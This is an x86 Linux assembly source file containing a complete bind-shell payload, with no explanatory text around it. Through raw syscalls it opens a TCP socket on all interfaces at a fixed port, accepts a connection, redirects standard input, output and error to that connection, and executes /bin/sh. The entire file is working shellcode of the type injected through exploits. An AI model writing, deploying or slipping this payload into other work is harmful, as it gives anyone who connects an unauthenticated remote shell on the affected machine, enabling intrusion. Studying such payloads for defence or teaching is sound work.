global _start           

section .text

_start:

    ;  socket(AF_INET, SOCK_STREAM, 0);
    xor eax, eax    ; zero out eax
    mov al, 102     ; socketcall()

    xor ebx, ebx    ; zero out ebx

    ; push socket() parameters
    push ebx        ; protocol
    push 1          ; SOCK_STREAM
    push 2          ; AF_INET

    mov bl, 1       ; socket()

    xor ecx, ecx    ; zero out ecx
    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; eax contains the newly created socket
    mov esi, eax    ; save the socket for future use

    ; bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    xor eax, eax    ; zero out eax
    mov al, 102     ; socketcall()

    xor ebx, ebx    ; zero out ebx

    ; push bind() parameters
    push ebx        ; INADDR_ANY
    push word 0x3582 ; port
    push word 2     ; AF_INET
    mov ecx, esp    ; point to the structure

    mov bl, 2       ; bind()

    push 16         ; sizeof(struct sockaddr_in)
    push ecx        ; &serv_addr
    push esi        ; sockfd
    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; listen(sockfd, 1);
    xor eax, eax    ; zero out eax
    mov al, 102     ; socketcall()

    xor ebx, ebx    ; zero out ebx
    mov bl, 4       ; listen()

    ; push listen() parameters
    push 1          ; backlog
    push esi        ; sockfd

    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; accept(sockfd, (struct sockaddr *)&cli_addr, &sin_size);
    xor eax, eax    ; zero out eax
    mov al, 102     ; socketcall()

    xor ebx, ebx    ; zero out ebx

    ; push accept() parameters
    push ebx        ; zero addrlen
    push ebx        ; null sockaddr
    push esi        ; sockfd

    mov bl, 5       ; accept()

    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; eax contains the descriptor for the accepted socket
    mov esi, eax

    ; dup2(connfd, 0);
    xor eax, eax    ; zero out eax
    mov al, 63      ; dup2()
    mov ebx, esi
    xor ecx, ecx
    int 0x80
    
    ; dup2(connfd, 1);
    xor eax, eax    ; zero out eax
    mov al, 63      ; dup2()
    mov ebx, esi
    inc ecx
    int 0x80

    ; dup2(connfd, 2);
    xor eax, eax    ; zero out eax
    mov al, 63      ; dup2()
    mov ebx, esi
    inc ecx
    int 0x80

    ; execve(“/bin/sh”, [“/bin/sh”, NULL], NULL);
    xor eax, eax    ; zero out eax
    push eax        ; push null bytes (terminate string)
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin
    mov ebx, esp    ; load address of /bin/sh

    push eax        ; null terminator
    push ebx        ; push address of /bin/sh 
    mov ecx, esp

    push eax        ; push null terminator
    mov edx, esp    ; empty envp array

    mov al, 11      
    int 0x80        ; execve()